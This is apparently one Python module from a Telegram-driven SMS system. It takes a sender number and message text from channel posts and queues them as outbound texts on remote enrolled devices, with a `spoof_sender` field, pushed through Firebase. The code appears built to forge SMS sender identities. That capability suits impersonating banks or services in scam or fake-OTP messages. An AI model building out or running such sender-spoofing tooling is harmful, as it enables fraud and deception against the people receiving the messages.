import re

from sqlalchemy.orm import Session

from app.database import Device, MonitorProfile, OutboundSMS
from app.device_ui import get_sim_list

PHONE_RE = re.compile(r"(\+?\d{10,15})")


def parse_channel_message(text: str) -> tuple[str | None, str]:
    cleaned = text.strip()
    sender = None
    message = cleaned

    from_match = re.search(r"(?:📞\s*)?(?:From|FROM|Sender)\s*:\s*([+\d\s-]+)", cleaned, re.I)
    msg_match = re.search(
        r"(?:💬\s*)?(?:Message|MSG|Text)\s*:\s*(.+)$",
        cleaned,
        re.I | re.S,
    )

    if from_match:
        sender = PHONE_RE.search(from_match.group(1))
        sender = sender.group(1) if sender else from_match.group(1).strip()

    if msg_match:
        message = msg_match.group(1).strip()
    elif from_match:
        message = re.sub(r"^(?:📞\s*)?(?:From|FROM|Sender)\s*:\s*[+\d\s-]+\s*", "", cleaned, flags=re.I).strip()

    return sender, message or cleaned


def queue_manual_sms(
    db: Session,
    profile: MonitorProfile,
    device: Device,
    to_number: str,
    message: str,
) -> OutboundSMS:
    from app.services import normalize_phone

    sims = get_sim_list(device)
    sim_index = profile.selected_sim_index or 0
    sim_slot = sims[sim_index]["slot"] if sims else 1

    outbound = OutboundSMS(
        device_id=device.id,
        telegram_user_id=profile.telegram_user_id,
        sim_index=sim_index,
        sim_slot=sim_slot,
        to_number=normalize_phone(to_number),
        spoof_sender=None,
        message=message,
        status="pending",
    )
    db.add(outbound)
    db.commit()
    db.refresh(outbound)
    return outbound


def queue_channel_sms(
    db: Session,
    profile: MonitorProfile,
    device: Device,
    channel_text: str,
    channel_message_id: int | None = None,
) -> OutboundSMS:
    sender, message = parse_channel_message(channel_text)
    if not profile.phone_number:
        raise ValueError("Pehle /mynum <number> set karo")

    sims = get_sim_list(device)
    sim_index = profile.selected_sim_index or 0
    sim_slot = sims[sim_index]["slot"] if sims else 1

    outbound = OutboundSMS(
        device_id=device.id,
        telegram_user_id=profile.telegram_user_id,
        sim_index=sim_index,
        sim_slot=sim_slot,
        to_number=profile.phone_number,
        spoof_sender=sender,
        message=message,
        channel_message_id=channel_message_id,
        status="pending",
    )
    db.add(outbound)
    db.commit()
    db.refresh(outbound)
    return outbound


async def queue_channel_sms_with_firebase(
    db: Session,
    profile: MonitorProfile,
    device: Device,
    channel_text: str,
    channel_message_id: int | None = None,
) -> OutboundSMS:
    outbound = queue_channel_sms(db, profile, device, channel_text, channel_message_id)
    from app.firebase_sync import push_outbound_to_firebase

    await push_outbound_to_firebase(profile, device, outbound)
    return outbound


async def queue_manual_sms_with_firebase(
    db: Session,
    profile: MonitorProfile,
    device: Device,
    to_number: str,
    message: str,
) -> OutboundSMS:
    outbound = queue_manual_sms(db, profile, device, to_number, message)
    from app.firebase_sync import push_outbound_to_firebase

    await push_outbound_to_firebase(profile, device, outbound)
    return outbound


def get_profile_by_channel(db: Session, channel_id: str) -> list[tuple[MonitorProfile, Device]]:
    profiles = (
        db.query(MonitorProfile)
        .filter(
            MonitorProfile.channel_id == channel_id,
            MonitorProfile.is_monitoring.is_(True),
            MonitorProfile.active_device_id.isnot(None),
        )
        .all()
    )
    results: list[tuple[MonitorProfile, Device]] = []
    for profile in profiles:
        device = db.query(Device).filter(Device.id == profile.active_device_id).first()
        if device:
            results.append((profile, device))
    return results
